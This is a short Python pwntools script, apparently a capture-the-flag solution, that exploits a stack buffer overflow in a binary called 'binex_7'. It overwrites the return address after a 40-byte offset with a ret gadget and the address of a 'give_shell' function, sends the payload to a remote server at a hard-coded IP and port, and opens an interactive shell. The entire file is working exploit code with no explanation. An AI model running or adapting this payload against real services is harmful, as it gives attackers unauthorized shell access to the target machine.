#!usr/bin/python3
from pwn import *

exe = './binex_7'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'debug'
host,port = '165.22.109.88', 1030

io = remote(host, port)
# io = process(exe)

offset = 40
payload = flat({
    offset: [
        rop.ret.address,
        elf.sym['give_shell']
    ]
})

io.sendline(payload)
io.interactive()